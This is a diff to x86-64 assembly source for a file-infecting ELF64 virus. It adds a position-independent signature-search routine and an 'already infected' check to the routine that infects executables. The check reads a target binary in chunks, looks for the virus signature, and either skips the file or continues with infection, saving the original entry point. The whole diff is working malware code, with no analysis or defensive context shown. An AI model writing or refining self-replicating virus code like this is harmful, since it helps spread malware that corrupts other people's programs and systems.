@@ -183,6 +183,82 @@ virus_str_len:
     ret
 
 ; ============================================
+; virus_search_signature - Search for signature in buffer
+; rdi = haystack (buffer to search in)
+; rsi = haystack_len (length of buffer)
+; rdx = needle (string to search for)
+; rcx = needle_len (length of needle)
+; Returns: rax = 1 if found, 0 if not found
+; Position-independent version for virus payload
+; ============================================
+virus_search_signature:
+    push rbp
+    mov rbp, rsp
+    push r12                    ; haystack
+    push r13                    ; haystack_len
+    push r14                    ; needle
+    push rbx                    ; current position
+
+    mov r12, rdi                ; r12 = haystack
+    mov r13, rsi                ; r13 = haystack_len
+    mov r14, rdx                ; r14 = needle
+    ; rcx already has needle_len
+
+    ; If needle is longer than haystack, not found
+    cmp rcx, r13
+    ja .vss_not_found
+
+    xor rbx, rbx                ; rbx = current position in haystack
+
+.vss_loop:
+    ; Check if we have enough bytes left
+    mov rax, r13
+    sub rax, rbx                ; bytes remaining
+    cmp rax, rcx
+    jb .vss_not_found           ; not enough bytes left
+
+    ; Compare needle with current position in haystack
+    push rcx                    ; save needle_len
+    lea rdi, [r12 + rbx]        ; current position in haystack
+    mov rsi, r14                ; needle
+    
+    ; Byte-by-byte comparison
+    xor rax, rax                ; match counter
+.vss_compare_loop:
+    cmp rax, rcx
+    jge .vss_found              ; all bytes matched
+
+    mov r8b, [rdi + rax]        ; byte from haystack
+    mov r9b, [rsi + rax]        ; byte from needle
+    cmp r8b, r9b
+    jne .vss_next               ; mismatch, try next position
+
+    inc rax
+    jmp .vss_compare_loop
+
+.vss_next:
+    pop rcx                     ; restore needle_len
+    inc rbx                     ; try next position
+    jmp .vss_loop
+
+.vss_found:
+    pop rcx                     ; restore needle_len
+    mov rax, 1                  ; found
+    jmp .vss_done
+
+.vss_not_found:
+    xor rax, rax                ; not found
+
+.vss_done:
+    pop rbx
+    pop r14
+    pop r13
+    pop r12
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; ============================================
 ; virus_list_and_infect - List files and infect ELF64 executables
 ; rdi = path buffer
 ; rsi = file count pointer
@@ -387,6 +463,99 @@ virus_infect_elf:
     jne .vi_close_fail
 
 .vi_valid_elf_type:
+    ; ============================================
+    ; Check if file is already infected by searching for signature
+    ; ============================================
+    ; We need to scan the file for the signature before infecting
+    ; Use [rbp-4224] as a temporary read buffer (will be reused for phdrs later)
+    
+    mov [rbp-48], r15           ; save r15 (virus base) temporarily
+    
+    ; Seek to beginning
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    
+    xor rbx, rbx                ; current file position
+    mov r14, [rbp-8]            ; file size
+
+.vi_sig_check_loop:
+    ; Read a chunk of the file
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rbp-4224]         ; buffer
+    mov edx, 4096               ; read up to 4096 bytes
+    syscall
+
+    test rax, rax
+    jle .vi_sig_check_done      ; EOF or error, not found
+
+    ; Search for signature in buffer
+    push rax                    ; save bytes_read
+    mov r15, [rbp-48]           ; restore r15 for signature access
+    lea rdi, [rbp-4224]         ; buffer
+    mov rsi, rax                ; bytes_read
+    lea rdx, [r15 + v_signature - virus_start]  ; signature
+    mov rcx, v_signature_len    ; signature length
+    call virus_search_signature
+    
+    pop rcx                     ; restore bytes_read into rcx
+    
+    ; If found, file is already infected
+    test rax, rax
+    jnz .vi_already_infected
+
+    ; Update position and check if more to read
+    add rbx, rcx                ; bytes read
+    cmp rbx, r14                ; compare with file size
+    jge .vi_sig_check_done      ; done reading
+
+    ; Seek back slightly to handle signatures that span chunk boundaries
+    mov rsi, rbx
+    sub rsi, v_signature_len
+    add rsi, 1
+    test rsi, rsi
+    js .vi_sig_check_done       ; shouldn't happen, but be safe
+    
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor edx, edx                ; SEEK_SET
+    syscall
+    
+    test rax, rax
+    js .vi_sig_check_done
+    
+    mov rbx, rax                ; update position
+    jmp .vi_sig_check_loop
+
+.vi_already_infected:
+    ; File is already infected, just close and skip
+    mov r15, [rbp-48]           ; restore r15
+    jmp .vi_close_fail
+
+.vi_sig_check_done:
+    ; File is not infected, proceed with infection
+    mov r15, [rbp-48]           ; restore r15
+    
+    ; Seek back to beginning to read ELF header again
+    mov eax, SYS_LSEEK
+    mov edi, r13d
+    xor esi, esi
+    xor edx, edx
+    syscall
+    
+    ; Read ELF header again
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rbp-112]          ; ELF header buffer
+    mov edx, 64
+    syscall
+    
+    ; Re-setup ELF header pointer
+    lea rdi, [rbp-112]
+
     ; Save original entry point
     mov rax, [rdi + 24]         ; e_entry at offset 24
     mov [rbp-16], rax
